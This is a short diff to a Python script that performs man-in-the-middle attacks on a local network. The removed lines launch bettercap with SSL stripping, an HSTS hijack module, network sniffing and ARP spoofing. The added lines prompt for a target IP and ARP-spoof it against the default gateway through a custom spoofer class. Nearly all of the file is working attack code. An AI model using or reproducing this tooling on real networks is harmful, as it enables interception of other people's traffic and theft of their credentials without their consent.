@@ -1,21 +1,13 @@
-import subprocess
+from bettercap import run_bettercap
+from arpspoof import *
 
-# subprocess.run('sudo bettercap -iface eth0 -eval "set http.proxy.sslstrip true; hstshijack/hstshijack; net.probe on; net.sniff on; arp.spoof on;"', shell=True)
-bettercap_eval = (
-    "set http.proxy.sslstrip true; "
-    "hstshijack/hstshijack; "
-    "net.probe on; "
-    "net.sniff on; "
-    "arp.spoof on;"
-)
+def main():
+    arp_spoofer = ArpSpoofer()
 
-bettercap_cmd = [
-    "sudo",
-    "bettercap",
-    "-iface",
-    "eth0",
-    "-eval",
-    bettercap_eval
-]
+    target_ip = input("Target IP: ")
+    gateway_ip = arp_spoofer.get_default_gateway_ip()
 
-subprocess.run(bettercap_cmd)
+    arp_spoofer.spoof(gateway_ip, target_ip)
+
+if __name__ == "__main__":
+    main()
